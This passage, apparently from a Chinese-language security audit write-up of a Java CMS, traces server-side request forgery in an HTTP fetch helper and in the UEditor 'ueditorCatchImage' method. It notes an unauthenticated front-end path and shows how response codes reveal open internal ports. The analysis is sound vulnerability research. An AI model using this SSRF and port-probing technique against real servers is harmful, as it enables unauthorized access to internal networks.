	CloseableHttpClient httpclient = HttpClients.custom()
			.setUserAgent(userAgent).build();
	return fetchHtml(httpclient, uri, charset);
}
```

查询该方法有被哪些方法调用，发现一个方法，在其中没有任何安全检查。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/856d3ced-ede6-4edd-bec0-b43947947d5c/23.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=5ad339f0d78ae8c476c7c30847f227e666bf8481a045aca9317667d4ac98308d&X-Amz-SignedHeaders=host&x-id=GetObject)

直接尝试构造请求，结果如下，成功对本地发起 SSRF。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/1647aa86-23f7-4c7c-a6b4-43823d1f2a1d/24.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=c95b9fbef1d5df1765e2088029ae0333f0d88064c33ec107835ef1225e436114&X-Amz-SignedHeaders=host&x-id=GetObject)

### URL.openConnection()

继续搜索相关请求方法，发现存在`openConnection`方法，在如下`ueditorCatchImage`方法中。

```java
protected void ueditorCatchImage(Site site, HttpServletRequest request,
                                 HttpServletResponse response) throws IOException {
    GlobalUpload gu = site.getGlobal().getUpload();
    PublishPoint point = site.getUploadsPublishPoint();
    FileHandler fileHandler = point.getFileHandler(pathResolver);
    String urlPrefix = point.getUrlPrefix();

    StringBuilder result = new StringBuilder("{\\"state\\": \\"SUCCESS\\", list: [");
    List<String> urls = new ArrayList<String>();
    List<String> srcs = new ArrayList<String>();

    String[] source = request.getParameterValues("source[]");
    if (source == null) {
        source = new String[0];
    }
    for (int i = 0; i < source.length; i++) {
        String src = source[i];
        String extension = FilenameUtils.getExtension(src);
        // 格式验证
        if (!gu.isExtensionValid(extension, Uploader.IMAGE)) {
            // state = "Extension Invalid";
            continue;
        }
        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection conn = (HttpURLConnection) new URL(src).openConnection();
        if (conn.getContentType().indexOf("image") == -1) {
            // state = "ContentType Invalid";
            continue;
        }
        if (conn.getResponseCode() != 200) {
            // state = "Request Error";
            continue;
        }
        String pathname = site.getSiteBase(Uploader.getQuickPathname(Uploader.IMAGE, extension));
        InputStream is = null;
        try {
            is = conn.getInputStream();
            fileHandler.storeFile(is, pathname);
        } finally {
            IOUtils.closeQuietly(is);
        }
        String url = urlPrefix + pathname;
        urls.add(url);
        srcs.add(src);
        result.append("{\\"state\\": \\"SUCCESS\\",");
        result.append("\\"url\\":\\"").append(url).append("\\",");
        result.append("\\"source\\":\\"").append(src).append("\\"},");
    }
    if (result.charAt(result.length() - 1) == ',') {
        result.setLength(result.length() - 1);
    }
    result.append("]}");
    logger.debug(result.toString());
    response.getWriter().print(result.toString());
}
```

查看该方法的使用情况，发现存在两处调用，选择一个前台不用被鉴权的方法进行查看。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/3cbdeba7-4f0f-4e86-b7e6-2513a34b9a80/25.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=baecf37bfdeebdaff2ae86c3246d5ea704c17f4d41326de7e9aa4f9e24e04fe8&X-Amz-SignedHeaders=host&x-id=GetObject)

通过判断逻辑构造请求，可以发现当端口未开放时则返回 500，当端口开放时则返回 SUCCESS。

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9cec919e-095e-49d1-93d5-12071f026953/26.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050200Z&X-Amz-Expires=3600&X-Amz-Signature=b6cc3bacfc4b6b6e9938061ef7013290f0a6e8d4c52d48e0232af9ff99b2c1c9&X-Amz-SignedHeaders=host&x-id=GetObject)
